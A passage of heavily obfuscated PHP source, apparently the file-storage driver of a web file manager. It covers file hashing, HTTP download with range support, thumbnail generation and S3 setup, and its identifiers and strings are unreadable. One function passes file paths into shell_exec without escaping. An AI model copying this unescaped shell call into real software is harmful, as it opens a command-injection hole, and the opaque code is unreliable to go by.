rtrim($Î¹ãË‘, $‚Äöè[8])); $Ò˜‡µ… = strrpos($Î¹ãË‘, $‚Äöè[8]); if ($Ò˜‡µ… === !1) { return $Î¹ãË‘; } return substr($Î¹ãË‘, $Ò˜‡µ… + 1); } public function pathFather($Æí ıÖÉ) { $Ò¿ş¡Çğ =& $_SERVER[äô®•½Â]; $Æí ıÖÉ = str_replace($Ò¿ş¡Çğ[100], $Ò¿ş¡Çğ[8], rtrim($Æí ıÖÉ, $Ò¿ş¡Çğ[8])); $ÕÚ”æñË = strrpos($Æí ıÖÉ, $Ò¿ş¡Çğ[8]); if ($ÕÚ”æñË === !1) { return $Ò¿ş¡Çğ[12]; } return substr($Æí ıÖÉ, 0, $ÕÚ”æñË + 1); } public function hashSimple($ÄïÔ•Îæ) { $—¬“ùÒ« =& $_SERVER[äô®•½Â]; if (!$ÄïÔ•Îæ) { return md5($—¬“ùÒ«[12]); } $ãôÜÏõ¦ = $this->size($ÄïÔ•Îæ); $œŠš²˜ = 200; $¼ïö¶†Ó = 50; if ($ãôÜÏõ¦ <= $œŠš²˜ * $¼ïö¶†Ó) { return $this->hashMd5($ÄïÔ•Îæ) . $ãôÜÏõ¦; } $¦Ïï‚ÃÏ = intval($ãôÜÏõ¦ / $¼ïö¶†Ó); $¨ŠâÃı› = $—¬“ùÒ«[12]; for ($Ñ¯‡‰š = 0; $Ñ¯‡‰š < $¼ïö¶†Ó; $Ñ¯‡‰š++) { $¨ŠâÃı› .= $this->fileSubstr($ÄïÔ•Îæ, $¦Ïï‚ÃÏ * $Ñ¯‡‰š, $œŠš²˜); } $¨ŠâÃı› .= $this->fileSubstr($ÄïÔ•Îæ, $ãôÜÏõ¦ - $œŠš²˜, $œŠš²˜); return md5($¨ŠâÃı›) . $ãôÜÏõ¦; } public static $md5Cache = array(); public function hashMd5($ä’ÁÁÕş) { if (!$ä’ÁÁÕş) { return md5($_SERVER[äô®•½Â][12]); } $ä’ÁÁÕş = $this->iconvSystem($ä’ÁÁÕş); if (isset(self::$md5Cache[$ä’ÁÁÕş])) { return self::$md5Cache[$ä’ÁÁÕş]; } self::$md5Cache[$ä’ÁÁÕş] = $this->hashMd5Shell($ä’ÁÁÕş); if (!self::$md5Cache[$ä’ÁÁÕş]) { self::$md5Cache[$ä’ÁÁÕş] = @md5_file($ä’ÁÁÕş); } return self::$md5Cache[$ä’ÁÁÕş]; } private function hashMd5Shell($»ì”¢¾«) { $¦ş´›µì =& $_SERVER[äô®•½Â]; if (!$»ì”¢¾«) { return md5($¦ş´›µì[12]); } if (!function_exists($¦ş´›µì[101])) { return !1; } $¤ÖşÔ€„ = array($¦ş´›µì[102], $¦ş´›µì[103]); $ÄÖ—Š¡ñ = Cache::get($¦ş´›µì[104]); if (!$ÄÖ—Š¡ñ) { $›©’äæÎ = BASIC_PATH . $¦ş´›µì[105]; $â½¸…’Û = md5_file($›©’äæÎ); $ÄÖ—Š¡ñ = $¦ş´›µì[106]; foreach ($¤ÖşÔ€„ as $á“œÚñÃ) { $õëĞí¶Æ = shell_exec($á“œÚñÃ . "\40\x22{$›©’äæÎ}\42"); if ($õëĞí¶Æ && substr(trim($õëĞí¶Æ), 0, 32) == $â½¸…’Û) { $ÄÖ—Š¡ñ = $á“œÚñÃ; break; } } Cache::set($¦ş´›µì[104], $ÄÖ—Š¡ñ, 3600); } if ($ÄÖ—Š¡ñ == $¦ş´›µì[106]) { return !1; } $õëĞí¶Æ = shell_exec($ÄÖ—Š¡ñ . "\40\x22{$»ì”¢¾«}\42"); $õëĞí¶Æ = str_replace($¦ş´›µì[107], $¦ş´›µì[12], $õëĞí¶Æ); return substr($õëĞí¶Æ, 0, 32); } public function link($®Œ½óå) { return $®Œ½óå; } public function fileOut($»êÄ€¾­, $ğàñë› = false, $ñşÎÆŸ = false, $°»Õ¯³ = '') { $›çšÍªÇ =& $_SERVER[äô®•½Â]; $this->cacheMethod(null, null); if (!$»êÄ€¾­ || !$this->exist($»êÄ€¾­)) { show_json(LNG($›çšÍªÇ[108]), !1, $ñşÎÆŸ); } $í¶Êèî = $this->getType() == $›çšÍªÇ[109]; $ÃÖû…àæ = $GLOBALS[$›çšÍªÇ[6]][$›çšÍªÇ[92]][$›çšÍªÇ[110]][$›çšÍªÇ[111]]; $ŞĞÓ×Ùù = (double) $GLOBALS[$›çšÍªÇ[6]][$›çšÍªÇ[92]][$›çšÍªÇ[110]][$›çšÍªÇ[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $˜Íé½ÍÈ = $this->infoFull($»êÄ€¾­); $±ÃèşÎ = $˜Íé½ÍÈ[$›çšÍªÇ[79]]; $¬ÉÈ‹è™ = gmdate($›çšÍªÇ[113], $˜Íé½ÍÈ[$›çšÍªÇ[88]]); $ÛˆÃö† = $ñşÎÆŸ ? $ñşÎÆŸ : $this->iconvApp($˜Íé½ÍÈ[$›çšÍªÇ[32]]); $Ğ¡Õ§„‘ = 0; $˜¨¬ÁÏ = $±ÃèşÎ - 1; $¤ö¦ıÛ¸ = $this->ext($ÛˆÃö†); if (in_array($¤ö¦ıÛ¸, array($›çšÍªÇ[114], $›çšÍªÇ[115], $›çšÍªÇ[116], $›çšÍªÇ[117]))) { $¤ö¦ıÛ¸ = $›çšÍªÇ[118]; } if (in_array($¤ö¦ıÛ¸, array($›çšÍªÇ[119]))) { $¤ö¦ıÛ¸ = $›çšÍªÇ[120]; } if (!$°»Õ¯³) { $°»Õ¯³ = md5($¬ÉÈ‹è™ . $±ÃèşÎ); } $°»Õ¯³ = $›çšÍªÇ[121] . $°»Õ¯³ . $›çšÍªÇ[121]; $ÙÆà = get_file_mime($¤ö¦ıÛ¸); $éÄé‚– = !0; $éÄé‚– = isset($_GET[$›çšÍªÇ[122]]) ? !1 : !0; if ($ğàñë› === !1 && !mime_support($ÙÆà)) { $ÙÆà = $›çšÍªÇ[123]; } header($›çšÍªÇ[124]); header($›çšÍªÇ[125] . $ÙÆà); $¯êÑ¬¬¥ = rawurlencode($ÛˆÃö†); $¯êÑ¬¬¥ = $›çšÍªÇ[121] . $¯êÑ¬¬¥ . $›çšÍªÇ[126] . $¯êÑ¬¬¥; if ($ğàñë›) { header($›çšÍªÇ[127]); header($›çšÍªÇ[128] . $¯êÑ¬¬¥); } else { if ($éÄé‚–) { header($›çšÍªÇ[129] . $¯êÑ¬¬¥); } } $ºéí™úÎ = 3600 * 24 * 30; header($›çšÍªÇ[130]); header($›çšÍªÇ[131]); header($›çšÍªÇ[132] . $ºéí™úÎ); header($›çšÍªÇ[133] . gmdate($›çšÍªÇ[113], time() + $ºéí™úÎ) . $›çšÍªÇ[134]); if (isset($_SERVER[$›çšÍªÇ[135]]) && strtotime($_SERVER[$›çšÍªÇ[135]]) == $˜Íé½ÍÈ[$›çšÍªÇ[88]]) { header($›çšÍªÇ[136], !0, 304); die; } if (isset($_SERVER[$›çšÍªÇ[137]]) && $_SERVER[$›çšÍªÇ[137]] == $°»Õ¯³) { header($›çšÍªÇ[138] . $°»Õ¯³, !0, 304); die; } header($›çšÍªÇ[138] . $°»Õ¯³); header($›çšÍªÇ[139] . $¬ÉÈ‹è™ . $›çšÍªÇ[134]); header($›çšÍªÇ[140] . $ÛˆÃö†); header($›çšÍªÇ[141]); header($›çšÍªÇ[142] . $±ÃèşÎ); header($›çšÍªÇ[143]); Hook::trigger($›çšÍªÇ[144], $»êÄ€¾­, $±ÃèşÎ, $ÛˆÃö†, $¤ö¦ıÛ¸); if (!$ğàñë› && $¤ö¦ıÛ¸ == $›çšÍªÇ[145]) { if ($±ÃèşÎ > 1024 * 1024 * 10) { die; } $«š¡¤• = $this->getContent($»êÄ€¾­); $«š¡¤• = Html::clearSVG($«š¡¤•); header($›çšÍªÇ[146] . strlen($«š¡¤•)); echo $«š¡¤•; die; } $Ç¢ôÌ€ñ = strtolower($_SERVER[$›çšÍªÇ[147]]); if ($í¶Êèî && $Ç¢ôÌ€ñ && $ÃÖû…àæ) { if (strstr($Ç¢ôÌ€ñ, $›çšÍªÇ[148])) { header($›çšÍªÇ[149] . $»êÄ€¾­); } else { if (strstr($Ç¢ôÌ€ñ, $›çšÍªÇ[150])) { header($›çšÍªÇ[151] . $»êÄ€¾­); } else { if (strstr($Ç¢ôÌ€ñ, $›çšÍªÇ[152])) { header($›çšÍªÇ[153] . $»êÄ€¾­); } } } if ($ŞĞÓ×Ùù) { header($›çšÍªÇ[154] . $ŞĞÓ×Ùù); } return; } if (isset($_SERVER[$›çšÍªÇ[155]])) { if (preg_match($›çšÍªÇ[156], $_SERVER[$›çšÍªÇ[155]], $Ğ™õÔú­)) { $Ğ¡Õ§„‘ = intval($Ğ™õÔú­[1]); $Ğ¡Õ§„‘ = $Ğ¡Õ§„‘ <= 0 ? 0 : ($Ğ¡Õ§„‘ >= $˜¨¬ÁÏ ? $˜¨¬ÁÏ : $Ğ¡Õ§„‘); if (!empty($Ğ™õÔú­[2])) { $®×İõØ§ = intval($Ğ™õÔú­[2]); $˜¨¬ÁÏ = $®×İõØ§ < $Ğ¡Õ§„‘ ? $Ğ¡Õ§„‘ : ($®×İõØ§ >= $˜¨¬ÁÏ ? $˜¨¬ÁÏ : $®×İõØ§); } } header($›çšÍªÇ[157]); header("\103\157\x6e\164\145\x6e\164\x2d\122\141\156\x67\145\x3a\40\142\171\164\145\163\x20{$Ğ¡Õ§„‘}\x2d{$˜¨¬ÁÏ}\x2f" . $±ÃèşÎ); } else { header($›çšÍªÇ[158]); } header($›çšÍªÇ[159]); header($›çšÍªÇ[160]); $ÄÕë°‘ = !0; if ($_SERVER[$›çšÍªÇ[161]] == $›çšÍªÇ[162] && $±ÃèşÎ > 1204 * 1024 * 1024 * 2) { $ÄÕë°‘ = !1; } if ($ÄÕë°‘) { header($›çšÍªÇ[163] . ($˜¨¬ÁÏ - $Ğ¡Õ§„‘ + 1)); } if ($_SERVER[$›çšÍªÇ[164]] == $›çšÍªÇ[165]) { return; } $›§ÓÙÛ” = array($›çšÍªÇ[166] => !1, $›çšÍªÇ[167] => $Ğ¡Õ§„‘, $›çšÍªÇ[168] => $˜¨¬ÁÏ, $›çšÍªÇ[169] => $¤ö¦ıÛ¸, $›çšÍªÇ[170] => $˜Íé½ÍÈ, $›çšÍªÇ[171] => $›çšÍªÇ[12], $›çšÍªÇ[172] => 0); $›§ÓÙÛ” = Hook::filter($›çšÍªÇ[173], $›§ÓÙÛ”); $ÅİıŠÍÇ = 1024 * 300; $ê…şâ‘… = 0; if ($ŞĞÓ×Ùù) { $ê…şâ‘… = intval(1000 * 1000 * ($ÅİıŠÍÇ / $ŞĞÓ×Ùù)); } while ($Ğ¡Õ§„‘ <= $˜¨¬ÁÏ) { $²ÔÑşÑ = timeFloat(); check_abort(); $·¨÷ÍÈŸ = $˜¨¬ÁÏ - $Ğ¡Õ§„‘ + 1; if ($·¨÷ÍÈŸ <= $ÅİıŠÍÇ) { $ÅİıŠÍÇ = $·¨÷ÍÈŸ; } $«š¡¤• = $this->fileSubstr($»êÄ€¾­, $Ğ¡Õ§„‘, $ÅİıŠÍÇ); if ($›§ÓÙÛ”[$›çšÍªÇ[166]]) { $›§ÓÙÛ”[$›çšÍªÇ[171]] = $«š¡¤•; $›§ÓÙÛ”[$›çšÍªÇ[172]] = $Ğ¡Õ§„‘; $›§ÓÙÛ” = Hook::filter($›çšÍªÇ[174], $›§ÓÙÛ”); $«š¡¤• = $›§ÓÙÛ”[$›çšÍªÇ[171]]; } echo $«š¡¤•; $Ğ¡Õ§„‘ += $ÅİıŠÍÇ; if ($ÅİıŠÍÇ == $·¨÷ÍÈŸ) { $Ğ¡Õ§„‘ = $˜¨¬ÁÏ + 1; } if ($ê…şâ‘…) { $˜àŠØ³î = intval(1000 * 1000 * (timeFloat() - $²ÔÑşÑ)); $ØÏ’ßõ° = $ê…şâ‘… - $˜àŠØ³î; if ($ØÏ’ßõ° > 5) { usleep($ØÏ’ßõ°); } } } } public function fileOutServer($¯¦¢å–Å, $ñë¢ıİÊ = false, $èÍ¦Å˜ = false, $”êÜİù– = '') { $this->fileOut($¯¦¢å–Å, $ñë¢ıİÊ, $èÍ¦Å˜, $”êÜİù–); } public function fileOutLink($Êµ²Şı÷) { header($_SERVER[äô®•½Â][175] . $Êµ²Şı÷); die; } public function cacheMethod($¿–ÅšÀš, $Ÿó—îÂÌ, $Ş„çĞ = null) { $Ææ ÆÏ =& $_SERVER[äô®•½Â]; static $¯Ÿ†œ›ş = array(); $»Ë•Œ÷Æ = $Ÿó—îÂÌ ? ltrim($this->getPathOuter($Ÿó—îÂÌ), $Ææ ÆÏ[8]) : $Ææ ÆÏ[12]; $Æ‰—ÆÍ = $Ææ ÆÏ[176] . $¿–ÅšÀš . $Ææ ÆÏ[177] . rtrim($»Ë•Œ÷Æ, $Ææ ÆÏ[8]); if (is_null($¿–ÅšÀš)) { $¯Ÿ†œ›ş = array(); return; } if (is_null($Ÿó—îÂÌ)) { foreach ($¯Ÿ†œ›ş as $Æ‰—ÆÍ => $¦Àªâ±£) { if (!strstr($Æ‰—ÆÍ, $Ææ ÆÏ[176] . $¿–ÅšÀš . $Ææ ÆÏ[178])) { continue; } unset($¯Ÿ†œ›ş[$Æ‰—ÆÍ]); } return; } if ($Ş„çĞ === $Ææ ÆÏ[179]) { unset($¯Ÿ†œ›ş[$Æ‰—ÆÍ]); return; } if (!is_null($Ş„çĞ)) { $¯Ÿ†œ›ş[$Æ‰—ÆÍ] = $Ş„çĞ; return; } $øøìÈ´Ø = isset($¯Ÿ†œ›ş[$Æ‰—ÆÍ]) ? $¯Ÿ†œ›ş[$Æ‰—ÆÍ] : null; if (!is_null($øøìÈ´Ø)) { return $øøìÈ´Ø; } $øøìÈ´Ø = $this->{$¿–ÅšÀš}($Ÿó—îÂÌ); $¯Ÿ†œ›ş[$Æ‰—ÆÍ] = $øøìÈ´Ø; return $øøìÈ´Ø; } public function cacheMethodInfoSet($³şÌÎù, $ƒ«ƒå­, $Øš·•µ€ = false) { $Ûâô«ÏÇ =& $_SERVER[äô®•½Â]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Ûâô«ÏÇ[180], $³şÌÎù, $ƒ«ƒå­); $this->cacheMethod($Ûâô«ÏÇ[181], $³şÌÎù, $ƒ«ƒå­ ? !1 : !0); if (is_array($Øš·•µ€)) { $this->cacheMethod($Ûâô«ÏÇ[182], $³şÌÎù, $Øš·•µ€); } } public function fileOutImage($©ô¿¿Î„, $Ÿ¸ùİÆÏ = 250) { $¾üµá„ =& $_SERVER[äô®•½Â]; set_timeout(); if (substr($©ô¿¿Î„, 0, 4) == $¾üµá„[152]) { $this->fileOutLink($©ô¿¿Î„); } $Å°£÷øå = $this->info($©ô¿¿Î„); $ÚŞ³˜Ã× = !1; $—ñçİúù = isset($GLOBALS[$¾üµá„[183]]) ? $GLOBALS[$¾üµá„[183]] : array(); if ($—ñçİúù && $—ñçİúù[$¾üµá„[184]] == $Å°£÷øå[$¾üµá„[87]]) { $Å°£÷øå = $—ñçİúù; $œß´×˜« = $Å°£÷øå[$¾üµá„[185]]; if ($œß´×˜« && isset($œß´×˜«[$¾üµá„[186]])) { if ($œß´×˜«[$¾üµá„[186]] <= $Ÿ¸ùİÆÏ && $œß´×˜«[$¾üµá„[187]] <= $Ÿ¸ùİÆÏ) { $ÚŞ³˜Ã× = !0; } } } if ($Å°£÷øå[$¾üµá„[79]] <= 1024 * 50 || $ÚŞ³˜Ã× || !function_exists($¾üµá„[188]) || $Å°£÷øå[$¾üµá„[169]] == $¾üµá„[189]) { return $this->fileOut($©ô¿¿Î„, !1, $Å°£÷øå[$¾üµá„[32]]); } $îğˆË÷¢ = kodIO::hashPath($Å°£÷øå); $áïÄ®÷ = "\x63\x6f\166\145\162\x5f{$îğˆË÷¢}\x5f{$Ÿ¸ùİÆÏ}\56\160\156\147"; $œÍ’“†í = IO_PATH_SYSTEM_TEMP . $¾üµá„[190]; $Îœ‘İèÒ = IO::infoFullSimple($œÍ’“†í); $Œ–Ôõ„ = $Îœ‘İèÒ && is_array($Îœ‘İèÒ) ? $Îœ‘İèÒ[$¾üµá„[87]] : $¾üµá„[12]; if (!$Œ–Ôõ„) { $Œ–Ôõ„ = IO::mkdir($œÍ’“†í); } if ($Å°£÷øå[$¾üµá„[191]] == $¾üµá„[192] && isset($Å°£÷øå[$¾üµá„[193]]) && $Å°£÷øå[$¾üµá„[193]] == kodIO::sourceID($Œ–Ôõ„)) { $ı¿‰ë = $Å°£÷øå[$¾üµá„[194]]; if ($Ÿ¸ùİÆÏ <= 500) { $Òò€…áô = preg_replace($¾üµá„[195], $¾üµá„[196], $Å°£÷øå[$¾üµá„[32]]); $ı¿‰ë = IO::fileNameExist($Œ–Ôõ„, $Òò€…áô); } return IO::fileOut(KodIO::make($ı¿‰ë), !1, $Å°£÷øå[$¾üµá„[32]]); } $×º”·İ˜ = IO::fileNameExist($Œ–Ôõ„, $áïÄ®÷); if ($×º”·İ˜) { return IO::fileOut(KodIO::make($×º”·İ˜), !1, $Å°£÷øå[$¾üµá„[32]]); } if ($Ÿ¸ùİÆÏ > 1000) { $this->makeImageCover($Œ–Ôõ„, $©ô¿¿Î„, $áïÄ®÷, $Ÿ¸ùİÆÏ); $this->makeImageCover($Œ–Ôõ„, $©ô¿¿Î„, "\143\x6f\x76\x65\x72\137{$îğˆË÷¢}\137\x32\65\60\x2e\160\156\x67", 250); $×º”·İ˜ = IO::fileNameExist($Œ–Ôõ„, $áïÄ®÷); if ($×º”·İ˜) { return IO::fileOut(KodIO::make($×º”·İ˜), !1, $Å°£÷øå[$¾üµá„[32]]); } die; } if (!kodIO::allowCover($Å°£÷øå)) { return $this->fileOut($©ô¿¿Î„, !1, $Å°£÷øå[$¾üµá„[32]]); } $’€Ğ©º = Cache::get($áïÄ®÷); if ($’€Ğ©º == $¾üµá„[197] || $’€Ğ©º == $¾üµá„[198]) { echo $’€Ğ©º; die; } Cache::set($áïÄ®÷, $¾üµá„[198], 60); $Ö²É”Ê¸ = array($Œ–Ôõ„, $Å°£÷øå[$¾üµá„[87]], $áïÄ®÷, $Ÿ¸ùİÆÏ); $åìÔòÂ¬ = $¾üµá„[199] . $Å°£÷øå[$¾üµá„[79]] . $¾üµá„[200] . $áïÄ®÷ . $¾üµá„[201] . $Å°£÷øå[$¾üµá„[32]] . $¾üµá„[202] . $Å°£÷øå[$¾üµá„[87]]; TaskQueue::add($¾üµá„[203], $Ö²É”Ê¸, $åìÔòÂ¬, $áïÄ®÷); } public function makeImageCover($îã…¥Ş®, $ğã·Ã‰·, $Áª×Æû, $º¸Š¨é¸) { $ÏïÑèâÙ =& $_SERVER[äô®•½Â]; if (IO::fileNameExist($îã…¥Ş®, $Áª×Æû)) { return $ÏïÑèâÙ[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $×½§Ü³Æ = $this->getPathOuter($ğã·Ã‰·); $õéÉ·èê = DATA_THUMB . $Áª×Æû; del_file($õéÉ·èê); $¯ª©Ú³‰ = IO::copy($×½§Ü³Æ, TEMP_FILES, !1, $Áª×Æû); if (!@file_exists($¯ª©Ú³‰)) { return $ÏïÑèâÙ[205]; } ImageThumb::createThumb($¯ª©Ú³‰, $õéÉ·èê, $º¸Š¨é¸, $º¸Š¨é¸ * 10); if (@file_exists($õéÉ·èê)) { Cache::remove($Áª×Æû); return IO::move($õéÉ·èê, $îã…¥Ş®); } Cache::set($Áª×Æû, $ÏïÑèâÙ[197], 600); del_file($õéÉ·èê); return $ÏïÑèâÙ[206] . $¯ª©Ú³‰ . $ÏïÑèâÙ[74]; } public function fileOutImageServer($‰¶°š×ş, $÷¹Ù©Şæ = 250) { $this->fileOutImage($‰¶°š×ş, $÷¹Ù©Şæ); } public function fileNameAuto($İ‘õ›–ğ, $Ö½ªÅŠÍ, $ÈÙ¿• = REPEAT_RENAME, $…¼øíØ = false) { $‰½¢¿ã« =& $_SERVER[äô®•½Â]; $ãıÄú¯Ú = $İ‘õ›–ğ === $‰½¢¿ã«[12] ? $Ö½ªÅŠÍ : rtrim($İ‘õ›–ğ, $‰½¢¿ã«[8]) . $‰½¢¿ã«[8] . $Ö½ªÅŠÍ; if ($ÈÙ¿• == REPEAT_REPLACE || !$this->exist($ãıÄú¯Ú) || $…¼øíØ && $ÈÙ¿• != REPEAT_RENAME_FOLDER) { return $Ö½ªÅŠÍ; } if ($ÈÙ¿• == REPEAT_SKIP) { return !1; } $ˆğŒ¤äº = $‰½¢¿ã«[10] . get_path_ext($Ö½ªÅŠÍ); $ˆğŒ¤äº = $ˆğŒ¤äº == $‰½¢¿ã«[10] || $…¼øíØ ? $‰½¢¿ã«[12] : $ˆğŒ¤äº; $¦Ñ­ëåË = 1; $şê £­† = substr($Ö½ªÅŠÍ, 0, strlen($Ö½ªÅŠÍ) - strlen($ˆğŒ¤äº)); $£õ«ÅĞ = $şê £­† . "\50{$¦Ñ­ëåË}\x29{$ˆğŒ¤äº}"; while ($this->exist(rtrim($İ‘õ›–ğ, $‰½¢¿ã«[8]) . $‰½¢¿ã«[8] . $£õ«ÅĞ)) { $£õ«ÅĞ = $şê £­† . "\50{$¦Ñ­ëåË}\51{$ˆğŒ¤äº}"; $¦Ñ­ëåË++; } return $£õ«ÅĞ; } private function fileNameAutoList($’ãŠ», $ Ò¼÷š, $ûâûÇ¬« = false) { $¯¦Åç’Ö =& $_SERVER[äô®•½Â]; $µşÉˆ±ö = $this->listPath($’ãŠ», !0); $µşÉˆ±ö = array_merge($µşÉˆ±ö[$¯¦Åç’Ö[85]], $µşÉˆ±ö[$¯¦Åç’Ö[86]]); $´¨ ÂÑú = array_to_keyvalue($µşÉˆ±ö, $¯¦Åç’Ö[12], $¯¦Åç’Ö[32]); $À·åí¼€ = $¯¦Åç’Ö[10] . get_path_ext($ Ò¼÷š); $À·åí¼€ = $À·åí¼€ == $¯¦Åç’Ö[10] || $ûâûÇ¬« ? $¯¦Åç’Ö[12] : $À·åí¼€; $ã¤îÖ¾¹ = substr($ Ò¼÷š, 0, strlen($ Ò¼÷š) - strlen($À·åí¼€)); $ü¯ä¥† = $ã¤îÖ¾¹ . "\x28\x30\x29{$À·åí¼€}"; for ($À‹¥¶æ¿ = 1; $À‹¥¶æ¿ <= count($´¨ ÂÑú) + 1; $À‹¥¶æ¿++) { $ü¯ä¥† = $ã¤îÖ¾¹ . "\50{$À‹¥¶æ¿}\x29{$À·åí¼€}"; if (!in_array_not_case($ü¯ä¥†, $´¨ ÂÑú)) { return $ü¯ä¥†; } } return $ü¯ä¥†; } public function listAllFiles($şõÎ³œ•, $º¦âœş) { $•Šª¼ş¤ =& $_SERVER[äô®•½Â]; if (empty($º¦âœş)) { return array(); } $£÷Òó‚ƒ = array_keys($º¦âœş); $İä³íÖœ = array(); $şõÎ³œ• = trim($şõÎ³œ•, $•Šª¼ş¤[8]); foreach ($º¦âœş as $“é²ìŞŞ => $‚Ì»‚ù¢) { $Ó·²Âçµ = ltrim(substr(trim($“é²ìŞŞ, $•Šª¼ş¤[8]), strlen($şõÎ³œ•)), $•Šª¼ş¤[8]); if (substr($“é²ìŞŞ, -1) == $•Šª¼ş¤[8]) { $Ó·²Âçµ = rtrim($Ó·²Âçµ, $•Šª¼ş¤[8]) . $•Šª¼ş¤[8]; } $İä³íÖœ = array_merge($İä³íÖœ, $this->slicePath($Ó·²Âçµ)); } $±ÇÚÆ—¡ = array(); foreach (array_unique($İä³íÖœ) as $ûœ¹ÕÚ³) { $Á†ÇÕÚÍ = array($•Šª¼ş¤[87] => $this->getPathOuter($•Šª¼ş¤[8] . $şõÎ³œ• . $•Šª¼ş¤[8] . $ûœ¹ÕÚ³), $•Šª¼ş¤[78] => 1, $•Šª¼ş¤[79] => 0); if (substr($ûœ¹ÕÚ³, -1) != $•Šª¼ş¤[8]) { $Á†ÇÕÚÍ[$•Šª¼ş¤[78]] = 0; $Ïˆ«ôÂ­ = $this->getPath($şõÎ³œ• . $•Šª¼ş¤[8] . $ûœ¹ÕÚ³); if (isset($º¦âœş[$Ïˆ«ôÂ­])) { $»±¨äÀÄ = $º¦âœş[$Ïˆ«ôÂ­]; if (isset($»±¨äÀÄ[$•Šª¼ş¤[79]])) { $Á†ÇÕÚÍ[$•Šª¼ş¤[79]] = intval($»±¨äÀÄ[$•Šª¼ş¤[79]]); } if (isset($»±¨äÀÄ[$•Šª¼ş¤[207]])) { $Á†ÇÕÚÍ[$•Šª¼ş¤[88]] = intval($»±¨äÀÄ[$•Šª¼ş¤[207]]); } } } $±ÇÚÆ—¡[] = $Á†ÇÕÚÍ; } return $±ÇÚÆ—¡; } public function slicePath($ã¢×Ğ) { $ûş•ÑĞ =& $_SERVER[äô®•½Â]; $¶ÉÓÙÎ÷ = explode($ûş•ÑĞ[8], trim($ã¢×Ğ, $ûş•ÑĞ[8])); $Ÿ¯€›Ö = 0; do { ++$Ÿ¯€›Ö; $ñáÃÔÆ™[] = implode($ûş•ÑĞ[8], array_slice($¶ÉÓÙÎ÷, 0, $Ÿ¯€›Ö)) . $ûş•ÑĞ[8]; } while ($Ÿ¯€›Ö < count($¶ÉÓÙÎ÷)); $ñáÃÔÆ™[count($¶ÉÓÙÎ÷) - 1] = $ã¢×Ğ; return $ñáÃÔÆ™; } public function getHost() { $¶ß¥©Ã =& $_SERVER[äô®•½Â]; $„Æ¹ùí¹ = parse_url(trim($this->domain, $¶ß¥©Ã[8])); $Şóµ™…É = isset($„Æ¹ùí¹[$¶ß¥©Ã[208]]) ? $„Æ¹ùí¹[$¶ß¥©Ã[208]] : http_type(); $ö¼À¿Ù¼ = isset($„Æ¹ùí¹[$¶ß¥©Ã[209]]) ? $„Æ¹ùí¹[$¶ß¥©Ã[209]] : $„Æ¹ùí¹[$¶ß¥©Ã[87]]; if (isset($„Æ¹ùí¹[$¶ß¥©Ã[210]])) { $ö¼À¿Ù¼ .= $¶ß¥©Ã[4] . $„Æ¹ùí¹[$¶ß¥©Ã[210]]; } return $Şóµ™…É . $¶ß¥©Ã[211] . $ö¼À¿Ù¼; } public function pathEncode($›‡ó¯‚©) { $èÉ†«ú¥ =& $_SERVER[äô®•½Â]; return str_replace($èÉ†«ú¥[212], $èÉ†«ú¥[8], rawurlencode($›‡ó¯‚©)); } public function writeLog($²€Ç£¶À = '', $Š»ğ™­õ = false) { $¥à§ôÂ¼ =& $_SERVER[äô®•½Â]; $¸Û´Á› = in_array(ACTION, array($¥à§ôÂ¼[213], $¥à§ôÂ¼[214])); if (!$¸Û´Á› && !GLOBAL_DEBUG) { return; } $«ûé¢–Û = $²€Ç£¶À; static $ñü‰Äç = null; if (!$ñü‰Äç) { $ñü‰Äç = strtoupper($this->getType()); } $²€Ç£¶À = $ñü‰Äç . $¥à§ôÂ¼[215] . $²€Ç£¶À; if ($Š»ğ™­õ) { $Úû­òš = error_get_last(); if ($Úû­òš) { $²€Ç£¶À = array($²€Ç£¶À, $Úû­òš); } } write_log($²€Ç£¶À, $¥à§ôÂ¼[216]); if ($¸Û´Á›) { throw new Exception($«ûé¢–Û); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($öÏÄù´µ) { set_timeout(); require_once SDK_DIR . $_SERVER[äô®•½Â][217]; parent::__construct(); $this->_init($öÏÄù´µ); } public function _init($–¡†ç„ß) { $Å®İâ¼ =& $_SERVER[äô®•½Â]; $this->config = $–¡†ç„ß; foreach ($–¡†ç„ß as $õ©œÆÛˆ => $˜¶¹è÷Ä) { if (isset($this->{$õ©œÆÛˆ})) { $this->{$õ©œÆÛˆ} = $˜¶¹è÷Ä; } } $this->endpoint = $–¡†ç„ß[$Å®İâ¼[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $–Œ‚«Ô• = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($–Œ‚«Ô•, 0, 7) == $Å®İâ¼[219]) { $–Œ‚«Ô• = $Å®İâ¼[220] . substr($–Œ‚«Ô•, 7); } $this->client->setEndpoint($–Œ‚«Ô•); if (in_array(ACTION, array($Å®İâ¼[213], $Å®İâ¼[214]))) { $this->client->setExceptions(); } } public function setSignVersion($…şØÉ÷î = "\166\64") { $this->signVer = $…şØÉ÷î; $this->client->setSignVersion($…şØÉ÷î); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ó¦×–ö) { return null; } } public function isBucketCors() { $Ææä•ôİ =& $_SERVER[äô®•½Â]; $Ğé€šÙ… = $this->getBucketCors(); if (!$Ğé€šÙ… || !is_array($Ğé€šÙ…)) { return !1; } if (!is_array($Ğé€šÙ…[$Ææä•ôİ[221]])) { $Ğé€šÙ…[$Ææä•ôİ[221]] = explode($Ææä•ôİ[50], $Ğé€šÙ…[$Ææä•ôİ[221]]); } if ($Ğé€šÙ…[$Ææä•ôİ[222]] != $Ææä•ôİ[223] || !in_array($Ææä•ôİ[223], $Ğé€šÙ…[$Ææä•ôİ[221]])) { return !1; } $É¶èÃ˜¢ = array_map($Ææä•ôİ[224], $Ğé€šÙ…[$Ææä•ôİ[225]]); if (!is_array($É¶èÃ˜¢)) { $É¶èÃ˜¢ = array(); } $‹”ÇçÒ = array($Ææä•ôİ[226], $Ææä•ôİ[227], $Ææä•ôİ[228], $Ææä•ôİ[229], $Ææä•ôİ[230]); $æ¡üå§ = array_diff($‹”ÇçÒ, 